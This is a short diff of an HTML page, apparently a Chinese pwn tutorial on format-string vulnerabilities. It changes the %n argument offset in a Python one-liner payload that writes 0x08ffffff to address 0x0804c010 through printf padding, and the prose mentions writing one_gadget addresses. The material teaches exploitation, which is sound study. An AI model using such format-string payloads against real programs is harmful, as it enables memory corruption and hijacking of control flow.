@@ -167,7 +167,7 @@
 <p><img src="image16" alt=""></p>
 <p>这里我们只输出六个字符，太少了。实际利用肯定要写入一个地址(比如one gadget的地址)，这个地址一般都很大比如0x80c0ffff，所以需要结合printf的对齐语法来写入大值。</p>
 <p>假设第10个偏移是0x0804c010，那我们理论上就可以把地址0x0804c010写入0x08ffffff的值</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">python3 -c 'import sys; sys.stdout.buffer.write(b"%150994943d%13$nAA\x10\xc0\x04\x08\n")' &gt; te</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">python3 -c 'import sys; sys.stdout.buffer.write(b"%150994943d%12$nAA\x10\xc0\x04\x08\n")' &gt; te</span><br></pre></td></tr></table></figure>
 
 <p><img src="image17" alt=""></p>
 <p>在输出大量padding过后成功修改完地址</p>
